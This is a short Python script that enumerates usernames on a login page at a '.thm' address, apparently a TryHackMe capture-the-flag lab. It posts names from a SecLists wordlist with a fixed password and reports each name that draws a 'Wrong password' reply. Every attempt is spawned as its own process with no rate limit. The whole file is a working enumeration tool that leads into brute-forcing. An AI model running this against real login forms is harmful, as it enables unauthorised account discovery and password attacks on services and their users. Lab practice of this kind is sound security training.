import requests
import multiprocessing

target = 'http://lookup.thm/login.php'
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

def user_check(name,target):
	data = {"username":name, "password":"password"}
	response = requests.post(target, data=data)
	if "Wrong password" in response.text:
		print(f"User found: {name}")

try:
	with open(username_file,'r') as user_file:
		users = user_file.readlines()
	for user in users:
		user = user.strip('\n')
		check = multiprocessing.Process(target=user_check,args=(user,target)).start()
except FileNotFoundError:
	print(f'Error: File path {username_file} does not exist.')
